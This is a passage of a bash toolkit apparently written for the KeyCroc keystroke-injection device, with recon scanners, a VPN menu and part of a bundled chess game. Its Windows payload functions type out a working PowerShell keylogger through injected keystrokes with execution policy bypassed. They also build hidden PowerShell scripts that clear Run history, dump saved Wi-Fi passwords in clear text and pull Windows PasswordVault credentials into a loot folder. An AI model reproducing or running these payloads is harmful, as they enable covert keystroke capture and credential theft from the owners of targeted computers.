##
target_ping() {
	clear
	echo -ne "$(Info_Screen 'Ping scan enter IP or web site name')\n\n"
	scan_all target_ping ping -c 5 -w 5
}
##
#----Recon Port scan with Netcat Function
##
target_port() {
	clear
	echo -ne "$(Info_Screen '-Port scan with Netcat enter IP or web site name
-Port range will start at port 1 enter port range to stop
-Click Ctrl+C to stop script')\n\n"
	read_all START SCAN Y/N AND PRESS [ENTER]
	case $r_a in
[yY] | [yY][eE][sS])
	read_all ENTER IP OR WEB SITE NAME AND PRESS [ENTER]
	echo -ne "${blue}ENTER PORT RANGE FOR SCAN AND PRESS [ENTER]:${clear}"; read range_port
	broken=0
break_script() {
	broken=1
}
	trap break_script SIGINT
for (( PORT = 1; PORT < $range_port; ++PORT )); do
	nc -z -w 1 "$r_a" "$PORT" < /dev/null;
if [ $? -eq 0 ]; then
	echo -ne "${green}Open port $PORT${clear}\n"
elif [ $broken -eq 1 ]; then break
fi
done ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n"
	croc_recon ;;
*)
	invalid_entry ; target_port ;;
esac
}
##
#----Recon SSL/TLS SSLScan Function
##
ssl_scan() {
	clear
	echo -ne "$(Info_Screen 'Scanning TLS/SSL configuration with SSLscan
-SSLscan is a command-line tool example: sslscan googel.com:443')\n\n"
	install_package sslscan SSLSCAN ssl_scan croc_recon
	scan_all ssl_scan sslscan --no-failed
}
##
#----Recon scan menu
##
MenuTitle RECON SCAN MENU
MenuColor 1 TCPDUMP SCAN ; echo -ne "        ${clear}\n"
MenuColor 2 NMAP SCAN ; echo -ne "           ${clear}\n"
MenuColor 3 TRACEROUTE SCAN ; echo -ne "     ${clear}\n"
MenuColor 4 WHOIS LOOKUP SCAN ; echo -ne "   ${clear}\n"
MenuColor 5 DNS LOOKUP SCAN ; echo -ne "     ${clear}\n"
MenuColor 6 PING TARGET SCAN ; echo -ne "    ${clear}\n"
MenuColor 7 TARGET PORT SCAN ; echo -ne "    ${clear}\n"
MenuColor 8 SSL/TLS SSLSCAN ; echo -ne "     ${clear}\n"
MenuColor 9 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
MenuEnd
	case $m_a in
	1) tcpdump_scan ; croc_recon ;;
	2) nmap_menu ; croc_recon ;;
	3) traceroute_scan ; croc_recon ;;
	4) whois_scan ; croc_recon ;;
	5) dns_scan ; croc_recon ;;
	6) target_ping ; croc_recon ;;
	7) target_port ; croc_recon ;;
	8) ssl_scan ; croc_recon ;;
	9) main_menu ;;
	0) exit 0 ;;
	[bB]) menu_B ;;
	*) invalid_entry ; croc_recon ;;
	esac
}
##
#----Windows laptop keystorkes Function
##
keystorkes_laptop() {
	echo -ne "\n${yellow}KeyCroc is pluged into OS${clear} --> ${OS_CHECK}\n"
	echo -ne "$(Info_Screen '-With this payload you can log Keystorkes from windows laptop pc
-May need to disenable windows defender for this to work
-TO STOP THE PAYLOAD PRESS Ctrl + c
-When stop this will open up notepad and save to loot/Croc_Pot')\n"
if [ "$(OS_CHECK)" = WINDOWS ]; then
	ATTACKMODE HID STORAGE
	sleep 5
	Q GUI r
	sleep 2
	Q STRING "powershell -nop -ex Bypass"
	Q ENTER
	sleep 1
	Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
	Q ENTER
	sleep 1
	Q STRING "function Test-KeyLogger(\$LOOTDIR=\"\$Croc\loot\Croc_Pot\winkeylogger.txt\")"
	Q ENTER
	Q STRING "{"
	Q ENTER
##
#----API declaration
##
	Q STRING  "\$APIsignatures = @'"
	Q ENTER
	Q STRING "[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)]"
	Q ENTER 
	Q STRING "public static extern short GetAsyncKeyState(int virtualKeyCode);"
	Q ENTER 
	Q STRING "[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]"
	Q ENTER
	Q STRING "public static extern int GetKeyboardState(byte[] keystate);"
	Q ENTER
	Q STRING "[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]"
	Q ENTER
	Q STRING "public static extern int MapVirtualKey(uint uCode, int uMapType);"
	Q ENTER
	Q STRING "[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]"
	Q ENTER
	Q STRING "public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);"
	Q ENTER
	Q STRING "'@"
	Q ENTER
	Q STRING "\$API = Add-Type -MemberDefinition \$APIsignatures -Name 'Win32' -Namespace API -PassThru"
	Q ENTER
##
#----output file
##
	Q STRING "\$no_output = New-Item -Path \$LOOTDIR -ItemType File -Force"
	Q ENTER
	Q STRING "try"
	Q ENTER
	Q STRING "{"
	Q ENTER
	Q STRING "Write-Host 'Keylogger started. Press CTRL+C to see results...' -ForegroundColor Red"
	Q ENTER
	Q STRING "while (\$true) {"
	Q ENTER
	Q STRING "Start-Sleep -Milliseconds 40"
	Q ENTER            
	Q STRING "for (\$ascii = 9; \$ascii -le 254; \$ascii++) {"
	Q ENTER
##
#----get key state
##
	Q STRING "\$keystate = \$API::GetAsyncKeyState(\$ascii)"
	Q ENTER
##
#----if key pressed
##
	Q STRING "if (\$keystate -eq -32767) {"
	Q ENTER
	Q STRING "\$null = [console]::CapsLock"
	Q ENTER
##
#----translate code
##
	Q STRING "\$virtualKey = \$API::MapVirtualKey(\$ascii, 3)"
	Q ENTER
##
#----get keyboard state and create stringbuilder
##
	Q STRING "\$kbstate = New-Object Byte[] 256"
	Q ENTER
	Q STRING "\$checkkbstate = \$API::GetKeyboardState(\$kbstate)"
	Q ENTER
	Q STRING "\$loggedchar = New-Object -TypeName System.Text.StringBuilder"
	Q ENTER
##
#----translate virtual key
##
	Q STRING "if (\$API::ToUnicode(\$ascii, \$virtualKey, \$kbstate, \$loggedchar, \$loggedchar.Capacity, 0))"
	Q ENTER 
	Q STRING "{"
	Q ENTER
##
#----if success, add key to logger file
##
	Q STRING "[System.IO.File]::AppendAllText(\$LOOTDIR, \$loggedchar, [System.Text.Encoding]::Unicode)"
	Q ENTER 
	Q STRING "}"
	Q ENTER
	Q STRING "}"
	Q ENTER
	Q STRING "}"
	Q ENTER
	Q STRING "}"
	Q ENTER
	Q STRING "}"
	Q ENTER
	Q STRING "finally"
	Q ENTER
	Q STRING "{"
	Q ENTER    
	Q STRING "notepad \$LOOTDIR"
	Q ENTER
	Q STRING "}"
	Q ENTER
	Q STRING "}"
	Q ENTER
	Q STRING "Test-KeyLogger"
	Q ENTER
	LED ATTACK
else
	echo -ne "\n\e[4;5m$(ColorRed '--The KeyCroc is not pluged into Windows pc This Payload will not work on this OS')-->${clear}$(OS_CHECK)\n"
fi
}
##
#----Windows Info Scan Function
##
windows_check() {
	clear
	echo -ne "$(Info_Screen '-WINDOWS SCAN CAN TAKE UP TO 1 MIN TO RUN
-This is an Bash Bunny payload working on the Croc
-This will Scan an Windows pc and collect alot of information
-Save to loot/Croc_pot folder')\n"
start_win_stat() {
	rm -f ${LOOT_WIND}
	ATTACKMODE HID STORAGE
	sleep 5
	Q GUI r
	sleep 1
	LED ATTACK
	Q STRING "powershell -nop -ex Bypass -w Hidden"
	Q ENTER
	sleep 5
	Q STRING ".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\run.ps1')"
	Q ENTER
	sleep 45
	Q STRING "exit"
	Q ENTER
	ATTACKMODE HID
	LED FINISH
	sleep 3
	LED OFF
}
	local LOOT_WIND=/root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt
	local WIN_PS=/root/udisk/tools/Croc_Pot/run.ps1
	local WIN_PS_A=/root/udisk/tools/Croc_Pot/info.ps1
	echo -ne "\n${yellow}KeyCroc is pluged into OS${clear} --> $(OS_CHECK)\n"
if [ "$(OS_CHECK)" = WINDOWS ]; then
if [[ -e "${WIN_PS}" && "${WIN_PS_A}" ]]; then
	start_win_stat | tee ${LOOT_WIND}
else
	sleep 1
echo -ne "powershell \"Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue\"\n\n\$VolumeName = \"KeyCroc\"\n\$computerSystem = Get-CimInstance CIM_ComputerSystem\n\$backupDrive = \$null\nGet-WmiObject win32_logicaldisk | % {\n
if (\$_.VolumeName -eq \$VolumeName) {\n        \$backupDrive = \$_.DeviceID\n    }\n}\n\n\$TARGETDIR = \$backupDrive + \"\loot\"\nif(!(Test-Path -Path \$TARGETDIR )){\n    New-Item -ItemType directory -Path \$TARGETDIR\n}\n\n\$TARGETDIR = \$backupDrive + \"\loot\Croc_Pot\"\nif(!(Test-Path -Path \$TARGETDIR )){\n   New-Item -ItemType directory -Path \$TARGETDIR\n}\n
\$backupPath = \$backupDrive + \"\loot\Croc_Pot\" + \"\KeyCroc_Wind_Log\" + \".txt\"\n\$TARGETDIR = \$MyInvocation.MyCommand.Path\n\$TARGETDIR = \$TARGETDIR -replace \".......\$\"\ncd \$TARGETDIR\nPowerShell.exe -ExecutionPolicy Bypass -File info.ps1 > \$backupPath" >> ${WIN_PS}
echo -ne "try\n{\n\$computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content\n}\ncatch\n{\n\$computerPubIP = \"Error getting Public IP\"\n}\n\$computerIP = Get-WmiObject Win32_NetworkAdapterConfiguration | Where {\$_.Ipaddress.length -gt 1}\n\$IsDHCPEnabled = \$False\n
\$Networks = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter \"DHCPEnabled=\$True\" | ? {\$_.IPEnabled}\nforeach (\$Network in \$Networks) {\nIf(\$network.DHCPEnabled) {\n\$IsDHCPEnabled = \$True\n  }\n[string[]]\$computerMAC = \$Network.MACAddress\n}\n\n\$computerSystem = Get-CimInstance CIM_ComputerSystem\n\$computerBIOS = Get-CimInstance CIM_BIOSElement\n
\$computerOs = Get-WmiObject Win32_operatingsystem | select Caption, CSName, Version, @{Name=\"InstallDate\";Expression={([WMI]'').ConvertToDateTime(\$_.InstallDate)}} , @{Name=\"LastBootUpTime\";Expression={([WMI]'').ConvertToDateTime(\$_.LastBootUpTime)}}, @{Name=\"LocalDateTime\";Expression={([WMI]'').ConvertToDateTime(\$_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory | Format-List\n\$computerCpu = Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List\n\$computerMainboard = Get-WmiObject Win32_BaseBoard | Format-List\n
\$computerRamCapacity = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { \"{0:N1} GB\" -f (\$_.sum / 1GB)}\n\$computerRam = Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name=\"Capacity\";Expression={ \"{0:N1} GB\" -f (\$_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table\n\n\$driveType = @{\n   2=\"Removable disk \"\n   3=\"Fixed local disk \"\n   4=\"Network disk \"\n   5=\"Compact disk \"}\n
\$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name=\"DriveType\";Expression={\$driveType.item([int]\$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name=\"Size_GB\";Expression={\"{0:N1} GB\" -f (\$_.Size / 1Gb)}}, @{Name=\"FreeSpace_GB\";Expression={\"{0:N1} GB\" -f (\$_.FreeSpace / 1Gb)}}, @{Name=\"FreeSpace_percent\";Expression={\"{0:N1}%\" -f ((100 / (\$_.Size / \$_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name=\"Size GB\"; Expression={\$_.Size_GB}; align=\"right\"; }, @{ Name=\"FreeSpace GB\"; Expression={\$_.FreeSpace_GB}; align=\"right\"; }, @{ Name=\"FreeSpace %\"; Expression={\$_.FreeSpace_percent}; align=\"right\"; }\n
\$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi](\$_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table\n\n\$RDP\nif ((Get-ItemProperty \"hklm:\System\CurrentControlSet\Control\Terminal Server\").fDenyTSConnections -eq 0) {\n    \$RDP = \"RDP is Enabled\"\n} else {\n    \$RDP = \"RDP is NOT Enabled\"\n}\n\n\$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { \$_.MACAddress -notlike \$null } | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress\n
\$WLANProfileNames = @()\n\$Output = netsh.exe wlan show profiles | Select-String -pattern \":\"\nForeach(\$WLANProfileName in \$Output){\n    \$WLANProfileNames += ((\$WLANProfileName -split \":\")[1]).Trim()\n}\n\$WLANProfileObjects = @()\n
Foreach(\$WLANProfileName in \$WLANProfileNames){\n    try{\n        \$WLANProfilePassword = (((netsh.exe wlan show profiles name=\"\$WLANProfileName\" key=clear | select-string -Pattern \"Key Content\") -split \":\")[1]).Trim()\n    } Catch {\n        \$WLANProfilePassword = \"The password is not stored in this profile\"\n    }\n    \$WLANProfileObject = New-Object PSCustomobject\n    \$WLANProfileObject | Add-Member -Type NoteProperty -Name \"ProfileName\" -Value \$WLANProfileName\n
        \$WLANProfileObject | Add-Member -Type NoteProperty -Name \"ProfilePassword\" -Value \$WLANProfilePassword\n    \$WLANProfileObjects += \$WLANProfileObject\n    Remove-Variable WLANProfileObject\n}\n\n\$luser = Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID\n
    \$process = Get-WmiObject Win32_process | select Handle, ProcessName, ExecutablePath, CommandLine\n\n\$listener = Get-NetTCPConnection | select @{Name=\"LocalAddress\";Expression={\$_.LocalAddress + \":\" + \$_.LocalPort}}, @{Name=\"RemoteAddress\";Expression={\$_.RemoteAddress + \":\" + \$_.RemotePort}}, State, AppliedSetting, OwningProcess\n\$listener = \$listener | foreach-object {\n    \$listenerItem = \$_\n    \$processItem = (\$process | where { [int]\$_.Handle -like [int]\$listenerItem.OwningProcess })\n
        new-object PSObject -property @{\n      \"LocalAddress\" = \$listenerItem.LocalAddress\n      \"RemoteAddress\" = \$listenerItem.RemoteAddress\n      \"State\" = \$listenerItem.State\n      \"AppliedSetting\" = \$listenerItem.AppliedSetting\n
          \"OwningProcess\" = \$listenerItem.OwningProcess\n      \"ProcessName\" = \$processItem.ProcessName\n    }\n} | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table\n\n\$process = \$process | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine\n\n\$service = Get-WmiObject Win32_service | select State, Name, DisplayName, PathName, @{Name=\"Sort\";Expression={\$_.State + \$_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName\n
\$software = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { \$_.DisplayName -notlike \$null } | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize\n
\$drivers = Get-WmiObject Win32_PnPSignedDriver | where { \$_.DeviceName -notlike \$null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion\n\n\$videocard = Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution\n\n[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]\n\$vault = New-Object Windows.Security.Credentials.PasswordVault\n\$vault = \$vault.RetrieveAll() | % { \$_.RetrievePassword();\$_ }\n
Clear-Host\nWrite-Host\n\n\$computerSystem.Name\n\"${LINE}\"\n\"Manufacturer: \" + \$computerSystem.Manufacturer\n\"Model: \" + \$computerSystem.Model\n\"Serial Number: \" + \$computerBIOS.SerialNumber\n\"\"\n\"\"\n\"\"\n\n\"OS:\"\n\"${LINE}\"+ (\$computerOs | out-string)\n
\"CPU:\"\n\"${LINE}\"+ (\$computerCpu | out-string)\n\n\"RAM:\"\n\"${LINE}\"\n\"Capacity:\" + \$computerRamCapacity+ (\$computerRam | out-string)\n\n\"Mainboard:\"\n\"${LINE}\"+ (\$computerMainboard | out-string)\n\n\"Bios:\"\n\"${LINE}\"+ (Get-WmiObject Win32_bios | out-string)\n\n\"Local-user:\"\n\"${LINE}\"+ (\$luser | out-string)\n\n\"HDDs:\"\n\"${LINE}\"+ (\$Hdds | out-string)\n\n\"COM & SERIAL DEVICES:\"\n\"${LINE}\"+ (\$COMDevices | Out-String)\n\n\"Network:\"\n\"${LINE}\"\n\"Computers MAC address: \" + \$computerMAC\n\"Computers IP address: \" + \$computerIP.ipaddress[0]\n\"Public IP address: \" + \$computerPubIP\n
\"RDP: \" + \$RDP\n\"\"\n(\$Network | out-string)\n\n\"W-Lan profiles:\"\n\"${LINE}\"+ (\$WLANProfileObjects | out-string)\n\n\"listeners / ActiveTcpConnections:\"\n\"${LINE}\"+ (\$listener | out-string)\n\n\"Current running process:\"\n\"${LINE}\"+ (\$process | out-string)\n
\"Services:\"\n\"${LINE}\"+ (\$service | out-string)\n\n\"Installed software:\"\n\"${LINE}\"+ (\$software | out-string)\n\n\"Installed drivers:\"\n\"${LINE}\"+ (\$drivers | out-string)\n\n\"Installed videocards:\"\n\"${LINE}\"+ (\$videocard | out-string)\n
\"Windows/user passwords:\"\n\"${LINE}\"\n\$vault | select Resource, UserName, Password | Sort-Object Resource | ft -AutoSize\n\nRemove-Variable -Name computerPubIP,\ncomputerIP,IsDHCPEnabled,Network,Networks,\ncomputerMAC,computerSystem,computerBIOS,computerOs,
computerCpu, computerMainboard,computerRamCapacity,\ncomputerRam,driveType,Hdds,RDP,WLANProfileNames,WLANProfileName,\nOutput,WLANProfileObjects,WLANProfilePassword,WLANProfileObject,luser,\nprocess,listener,listenerItem,process,service,software,drivers,videocard,\nvault -ErrorAction SilentlyContinue -Force" >> ${WIN_PS_A}
	sleep 1
	start_win_stat | tee ${LOOT_WIND}
fi
else
	echo -ne "\n\e[5m$(ColorRed '--The KeyCroc is not pluged into Windows pc This Payload will not work on this OS')-->$(OS_CHECK)\n"
fi
cat ${LOOT_WIND}
}
##
#----VPN SETUP-Start/stop Function
##
croc_vpn() {
	local vpn_file_A=/etc/openvpn/*.ovpn
	local vpn_file=/root/udisk/*.ovpn
	echo -ne "$(Info_Screen '-First you will need to download the (filename.ovpn) file
-From your VPN server of choice
-Place it on the keycroc root of the udisk
-Then select #1 VPN SETUP to do the rest
-Check to see if openvpn is installed')\n"
setup_vpn() {
##
#----VPN Check/install openvpn
##
	install_package openvpn OPENVPN setup_vpn croc_vpn
##
#----VPN user input
##
if [ -f ${vpn_file} ]; then
	echo -ne "\n$(ColorYellow 'FOUND .ovpn FILE MOVING IT TO ect/openvpn')\n"
	find . -name *.ovpn -exec mv '{}' "/etc/openvpn/" ";"
	touch /etc/openvpn/credentials
	read_all ENTER YOUR USER NAME AND PRESS [ENTER] ; echo ${r_a} >> /etc/openvpn/credentials
	read_all ENTER YOUR PASSWD AND PRESS [ENTER] ; echo ${r_a} >> /etc/openvpn/credentials
	sed -i 's/auth-user-pass/auth-user-pass \/etc\/openvpn\/credentials/g' ${vpn_file_A}
	openvpn --config ${vpn_file_A} --daemon
else
	echo -ne "\n${LINE_}\e[5m$(ColorRed 'DID NOT FIND .ovpn FILE ON THE KEYCROC UDISK')${LINE_}\n"
fi
}
##
#----VPN Menu
##
MenuTitle VPN MENU
MenuColor 1 VPN SETUP ; echo -ne "           ${clear}\n"
MenuColor 2 ENABLE VPN ; echo -ne "          ${clear}\n"
MenuColor 3 DISABLE VPN ; echo -ne "         ${clear}\n"
MenuColor 4 VPN STATUS ; echo -ne "          ${clear}\n"
MenuColor 5 EDIT .OVPN FILE ; echo -ne "     ${clear}\n"
MenuColor 6 REMOVE VPN FILES ; echo -ne "    ${clear}\n"
MenuColor 7 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
MenuEnd
	case $m_a in
	1) setup_vpn ; croc_vpn ;;
	2) openvpn --config ${vpn_file_A} --daemon ; echo -ne "\n$(ColorGreen 'ENABLE VPN CHECK VPN STATUS')\n" ; croc_vpn ;;
	3) killall openvpn ; service openvpn restart ; echo -ne "\n$(ColorRed 'DISABLE VPN CHECK VPN STATUS')\n" ; croc_vpn ;;
	4) route -n ; ifconfig ; ip route show ; systemctl status openvpn* ; croc_vpn ;;
	5) nano ${vpn_file_A} ; croc_vpn ;;
	6) rm -f ${vpn_file_A} /etc/openvpn/credentials ${vpn_file} ; echo -ne "\n$(ColorRed '.OVPN AND CREDENTIALS FILES HAS BEEN REMOVED')\n" ; croc_vpn ;;
	7) main_menu ;;
	0) exit 0 ;;
	[bB]) menu_B ;;
	*) invalid_entry ; croc_vpn ;;
	esac
}
##
#----Croc Pot Plus Pass time
##
pass_time() {
	clear
	echo -ne "$(Info_Screen '-I am not the developer of these scripts
-Thought I would share them
-Show the power of the keycroc and bash scripting')\n"
##
#----Pass time Chess
##
chess_game() {
# Chess Bash
# a simple chess game written in an inappropriate language :)
#
# Copyright (c) 2015 by Bernhard Heinloth <bernhard@heinloth.net>
#
# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version.
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.
# Default values
strength=3
namePlayerA="Player"
namePlayerB="AI"
color=true
colorPlayerA=4
colorPlayerB=1
colorHover=4
colorHelper=true
colorFill=true
ascii=false
warnings=false
computer=-1
mouse=true
guiconfig=false
cursor=true
sleep=2
cache=""
cachecompress=false
unicodelabels=true
port=12433
# internal values
timestamp=$( date +%s%N )
fifopipeprefix="/tmp/chessbashpipe"
selectedX=-1
selectedY=-1
selectedNewX=-1
selectedNewY=-1
remote=0
remoteip=127.0.0.1
remotedelay=0.1
remotekeyword="remote"
aikeyword="ai"
aiPlayerA="Marvin"
aiPlayerB="R2D2"
A=-1
B=1
originY=4
originX=7
hoverX=0
hoverY=0
hoverInit=false
labelX=-2
labelY=9
type stty >/dev/null 2>&1 && useStty=true || useStty=false
# Choose unused color for hover
while (( colorHover == colorPlayerA || colorHover == colorPlayerB )) ; do
	(( colorHover++ ))
done
# Check Unicode availbility
# We do this using a trick: printing a special zero-length unicode char (http://en.wikipedia.org/wiki/Combining_Grapheme_Joiner) and retrieving the cursor position afterwards.
# If the cursor position is at beginning, the terminal knows unicode. Otherwise it has printed some replacement character.
echo -en "\e7\e[s\e[H\r\xcd\x8f\e[6n" && read -sN6 -t0.1 x
if [[ "${x:4:1}" == "1" ]] ; then
	ascii=false
	unicodelabels=true
else
	ascii=true
	unicodelabels=false
fi
echo -e "\e[u\e8\e[2K\r\e[0m\nWelcome to \e[1mChessBa.sh\e[0m - a Chess game written in Bash \e[2mby Bernhard Heinloth, 2015\e[0m\n"
# Print version information
function version() {
	echo "ChessBash 0.4"
}
# Wait for key press
# no params/return
function anyKey(){
	$useStty && stty echo
	echo -e "\e[2m(Press any key to continue)\e[0m"
	read -sN1
	$useStty && stty -echo
}
# Error message, p.a. on bugs
# Params:
#	$1	message
# (no return value, exit game)
function error() {
if $color ; then
	echo -e "\e[0;1;41m $1 \e[0m\n\e[3m(Script exit)\e[0m" >&2
else
	echo -e "\e[0;1;7m $1 \e[0m\n\e[3m(Script exit)\e[0m" >&2
fi
	anyKey
exit 1
}
# Check prerequisits (additional executables)
# taken from an old script of mine (undertaker-tailor)
# Params:
#	$1	name of executable
function require() {
	type "$1" >/dev/null 2>&1 ||
{
	echo "This requires $1 but it is not available on your system. Aborting." >&2
	exit 1
}
}
# Validate a number string
# Params:
#	$1	String with number
# Return 0 if valid, 1 otherwise
function validNumber() {
if [[ "$1" =~ ^[0-9]+$ ]] ; then
	return 0
else
	return 1
fi
}
# Validate a port string
# Must be non privileged (>1023)
# Params:
#	$1	String with port number
# Return 0 if valid, 1 otherwise
function validPort() {
if validNumber "$1" && (( 1 < 65536 && 1 > 1023 )) ; then
	return 0
else
	return 1
fi
}
# Validate an IP v4 or v6 address
# source: http://stackoverflow.com/a/9221063
# Params:
#	$1	IP address to validate
# Return 0 if valid, 1 otherwise
function validIP() {
if [[ "$1" =~ ^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))|((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))))$ ]] ; then
	return 0
else
	return 1
fi
}
# Named ANSI colors
declare -a colors=( "black" "red" "green" "yellow" "blue" "magenta" "cyan" "white" )
# Retrieve ANSI color code from string
# Black and white are ignored!
# Params:
#	$1	Color string
# Return Color code or 0 if not a valid
function getColor() {
local c
for (( c=1; c<7; c++ )) ; do
	local v=${colors[$c]:0:1}
	local i=${1:0:1}
if [[ "${v^^}" == "${i^^}" || "$c" -eq "$i" ]] ; then
	return $c
fi
done
return 0
}
# Check if ai player
# Params:
#	$1	player
# Return status code 0 if ai player
function isAI() {
if (( $1 < 0 )) ; then
	if [[ "${namePlayerA,,}" == "${aikeyword,,}" ]] ; then
		return 0
		else
		return 1
	fi
else
	if [[ "${namePlayerB,,}" == "${aikeyword,,}" ]] ; then
		return 0
	else
		return 1
	fi
fi
}
# Help message
# Writes text to stdout
function help {
	echo
	echo -e "\e[1mChess Bash\e[0m - a small chess game written in Bash"
	echo
	echo -e "\e[4mUsage:\e[0m $0 [options]"
	echo
	echo -e "\e[4mConfiguration options\e[0m"
	echo "    -g         Use a graphical user interface (instead of more parameters)"
	echo
	echo -e "\e[4mGame options\e[0m"
	echo -e "    -a \e[2mNAME\e[0m    Name of first player, \"$aikeyword\" for computer controlled or the"
	echo "               IP address of remote player (Default: $namePlayerA)"
	echo -e "    -b \e[2mNAME\e[0m    Name of second player, \"$aikeyword\" for computer controlled or"
	echo -e "               \"$remotekeyword\" for another player (Default: \e[2m$namePlayerB\e[0m)"
	echo -e "    -s \e[2mNUMBER\e[0m  Strength of computer (Default: \e[2m$strength\e[0m)"
	echo -e "    -w \e[2mNUMBER\e[0m  Waiting time for messages in seconds (Default: \e[2m$sleep\e[0m)"
	echo
	echo -e "\e[4mNetwork settings for remote gaming\e[0m"
	echo -e "    -P \e[2mNUMBER\e[0m  Set port for network connection (Default: \e[2m$port\e[0m)"
	echo -e "\e[1;33mAttention:\e[0;33m On a network game the person controlling the first player / A"
	echo -e "(using \"\e[2;33m-b $remotekeyword\e[0;33m\" as parameter) must start the game first!\e[0m"
	echo
	echo -e "\e[4mCache management\e[0m"
	echo -e "    -c \e[2mFILE\e[0m    Makes cache permanent - load and store calculated moves"
	echo "    -z         Compress cache file (only to be used with -c, requires gzip)"
	echo -e "    -t \e[2mSTEPS\e[0m   Exit after STEPS ai turns and print time (for benchmark)"
	echo
	echo -e "\e[4mOutput control\e[0m"
	echo "    -h         This help message"
	echo "    -v         Version information"
	echo "    -V         Disable VT100 cursor movement (for partial output changes)"
	echo "    -M         Disable terminal mouse support"
	echo "    -i         Enable verbose input warning messages"
	echo "    -l         Board labels in ASCII (instead of Unicode)"
	echo "    -p         Plain ascii output (instead of cute unicode figures)"
	echo "               This implies ASCII board labels (\"-l\")"
	echo "    -d         Disable colors (only black/white output)"
	echo -e "    \e[4mFollowing options will have no effect while colors are disabled:\e[0m"
